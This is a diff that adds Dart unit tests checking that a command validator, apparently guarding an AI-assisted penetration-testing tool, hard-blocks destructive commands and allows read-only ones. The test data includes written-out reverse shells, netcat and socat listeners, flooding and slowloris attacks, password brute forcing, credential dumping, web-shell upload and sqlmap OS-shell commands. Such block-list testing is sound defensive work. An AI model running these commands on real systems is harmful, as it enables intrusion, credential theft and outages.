@@ -205,6 +205,108 @@ void main() {
     });
   });
 
+  group('mandatory non-destructive assessment policy', () {
+    Future<void> expectSafetyBlock(String command) async {
+      final result = await CommandValidator.validate(
+        command,
+        dummySettings,
+        dummyLlm,
+      );
+      expect(result.shouldHardBlock, isTrue, reason: command);
+      expect(result.reason, contains('SAFETY BLOCK'));
+    }
+
+    test('deterministic policy rechecks an untrusted corrected command', () {
+      final result = CommandValidator.validateMandatoryPolicy(
+        'curl -X DELETE http://192.0.2.10/api/users/1',
+      );
+      expect(result.shouldHardBlock, isTrue);
+      expect(result.reason, contains('SAFETY BLOCK'));
+    });
+
+    test('blocks denial-of-service and flooding techniques', () async {
+      await expectSafetyBlock('hping3 --flood -S 192.0.2.10');
+      await expectSafetyBlock('nmap --script dos -p 443 192.0.2.10');
+      await expectSafetyBlock('nmap --script intrusive -p 443 192.0.2.10');
+      await expectSafetyBlock('nmap --script http-slowloris 192.0.2.10');
+      await expectSafetyBlock('ab -n 10000 -c 100 http://192.0.2.10/');
+    });
+
+    test('blocks target configuration and account modification', () async {
+      await expectSafetyBlock('ldapmodify -x -f change.ldif');
+      await expectSafetyBlock(
+        'snmpset -v2c -c private 192.0.2.10 sysName.0 s changed',
+      );
+      await expectSafetyBlock('useradd persistence-user');
+    });
+
+    test('blocks credential attacks and credential dumping', () async {
+      await expectSafetyBlock(
+        'hydra -l admin -P passwords.txt ssh://192.0.2.10',
+      );
+      await expectSafetyBlock('secretsdump.py domain/user@192.0.2.10');
+      await expectSafetyBlock('cat /etc/shadow');
+    });
+
+    test('blocks reverse shells and full exploit payloads', () async {
+      await expectSafetyBlock("nc -e /bin/sh 192.0.2.5 4444");
+      await expectSafetyBlock('nc -lvnp 4444');
+      await expectSafetyBlock('socat TCP-LISTEN:4444 EXEC:/bin/sh');
+      await expectSafetyBlock('python3 -m http.server 8000');
+      await expectSafetyBlock(
+        'msfconsole -q -x "use exploit/test; set payload cmd/unix/reverse; exploit; exit"',
+      );
+    });
+
+    test('blocks target uploads and unsafe SQL exploitation', () async {
+      await expectSafetyBlock('curl -T shell.php http://192.0.2.10/uploads/');
+      await expectSafetyBlock("curl -d 'name=changed' http://192.0.2.10/api");
+      await expectSafetyBlock(
+        'wget --post-data name=changed http://192.0.2.10/api',
+      );
+      await expectSafetyBlock(
+        "python3 -c \"import requests; requests.post('http://192.0.2.10/api')\"",
+      );
+      await expectSafetyBlock(
+        'curl --request=POST http://192.0.2.10/api',
+      );
+      await expectSafetyBlock(
+        'wget --method=DELETE http://192.0.2.10/api/items/1',
+      );
+      await expectSafetyBlock(
+        "python3 -c \"import requests; requests.request('PATCH', 'http://192.0.2.10/api')\"",
+      );
+      await expectSafetyBlock('scp payload.bin user@192.0.2.10:/tmp/payload');
+      await expectSafetyBlock('redis-cli -h 192.0.2.10 SET proof changed');
+      await expectSafetyBlock('sqlmap -u http://192.0.2.10/?id=1 --os-shell');
+      await expectSafetyBlock('sqlmap -u http://192.0.2.10/?id=1 --dump');
+    });
+
+    test('allows framework check mode without a payload', () async {
+      final result = await CommandValidator.validate(
+        'msfconsole -q -x "use exploit/test; set RHOSTS 192.0.2.10; check; exit"',
+        dummySettings,
+        dummyLlm,
+      );
+      expect(result.shouldHardBlock, isFalse);
+    });
+
+    test('allows targeted read-only validation commands', () async {
+      for (final command in [
+        'curl -sk https://192.0.2.10/robots.txt',
+        'ldapsearch -x -H ldap://192.0.2.10 -b dc=example,dc=test -s base',
+        'nmap -sV -p 3389 192.0.2.10',
+      ]) {
+        final result = await CommandValidator.validate(
+          command,
+          dummySettings,
+          dummyLlm,
+        );
+        expect(result.shouldHardBlock, isFalse, reason: command);
+      }
+    });
+  });
+
   // ---------------------------------------------------------------------------
   // Tier 2 — graceful degradation (LLM unavailable)
   // ---------------------------------------------------------------------------
